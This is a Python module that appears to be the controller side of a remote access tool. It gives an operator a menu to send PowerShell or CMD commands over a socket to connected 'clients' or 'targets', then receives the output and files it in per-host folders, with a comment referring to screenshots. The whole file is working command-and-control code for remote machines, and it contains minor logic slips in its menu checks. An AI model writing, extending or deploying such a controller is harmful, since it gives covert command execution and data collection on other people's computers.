import os
import time
import socket
import shutil
from termcolor import colored


class Freestyle:
    def __init__(self, con, root, tmp_availables, clients, targets):
        self.con = con
        self.root = root
        self.tmp_availables = tmp_availables
        self.clients = clients
        self.targets = targets

    def bytes_to_number(self, b):
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def freestyle_menu(self):
        print(f"\t\t({colored('1', 'yellow')})Run Powershell Command")
        print(f"\t\t({colored('2', 'yellow')})Run CMD Command")
        print(f"\n\t\t({colored('0', 'yellow')})Back")

        return

    def recv_file(self, text):
        def make_dir():
            # Create a directory with host's name if not already exists.
            for item in self.tmp_availables:
                for conKey, ipValue in self.clients.items():
                    for ipKey in ipValue.keys():
                        if item[1] == ipKey:
                            ipval = item[1]
                            host = item[2]
                            user = item[3]
                            path = os.path.join(self.root, host)
                            try:
                                os.makedirs(path)

                            except FileExistsError:
                                pass

                            return ipval, host, user, path

        def file_name():
            try:
                filename = self.con.recv(1024)
                print(f"Filename: {filename}")
                self.con.send("Filename OK".encode())

                return filename

            except (WindowsError, socket.error) as e:
                print(e)
                return False

        def fetch(filename):
            try:
                size = self.con.recv(4)
                print(size)
                size = self.bytes_to_number(size)
                current_size = 0
                buffer = b""
                try:
                    with open(filename, 'wb') as file:
                        while current_size < size:
                            data = self.con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                except FileExistsError:
                    with open(filename, 'ab') as file:
                        while current_size < size:
                            data = self.con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

            except (WindowsError, socket.error) as e:
                print(e)
                return False

        def output():
            # Print file content to screen
            with open(filename, 'r') as file:
                data = file.read()
                print(data)

        def confirm():
            try:
                msg = "OK".encode()
                self.con.send(msg)
                ans = self.con.recv(1024).decode()
                print(f"[{colored('V', 'green')}]{ans}")

            except (WindowsError, socket.error) as e:
                print(e)
                return False

        def move(filename, path):
            # Move screenshot file to directory
            filename = str(filename).strip("b'")
            src = os.path.abspath(filename)
            dst = fr"{path}"
            shutil.move(src, dst)

        ipval, host, user, path = make_dir()
        filename = file_name()
        fetch(filename)
        if text:
            output()

        confirm()
        move(filename, path)

    def execute(self, platform):
        while True:
            if str(platform) == "ps":
                try:
                    self.con.send("ps".encode())
                    cmd = input("PS>")
                    self.con.send(cmd.encode())
                    time.sleep(1)

                    return True

                except (WindowsError, socket.error) as e:
                    print(e)
                    return False

            elif str(platform) == "cmd":
                try:
                    self.con.send("cmd".encode())
                    cmd = input("CMD>")
                    self.con.send(cmd.encode())
                    time.sleep(1)

                    return True

                except (WindowsError, socket.error) as e:
                    print(e)
                    return False

    def freestyle(self):
        while True:
            self.freestyle_menu()

            try:
                choice = int(input("#>"))

                if choice > 3:
                    print(f"[{colored('*', 'red')}]Wrong Number. "
                          f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}]\n")
                    continue

            except ValueError:
                print(
                    f"[{colored('*', 'red')}]Numbers only. Choose between "
                    f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}].\n")
                continue

            try:
                # Run Powershell Command
                if int(choice) == 1:
                    ex = "ps"
                    self.execute(ex)
                    self.recv_file(text=True)

                # Run CMD Command
                elif int(choice) == 2:
                    ex = "cmd"
                    self.execute(ex)
                    self.recv_file(text=True)

                elif int(choice) == 0:
                    self.con.send("back".encode())
                    ans = self.con.recv(1024).decode()
                    # print(ans)
                    return

            except socket.error as e:
                print(e)
                break
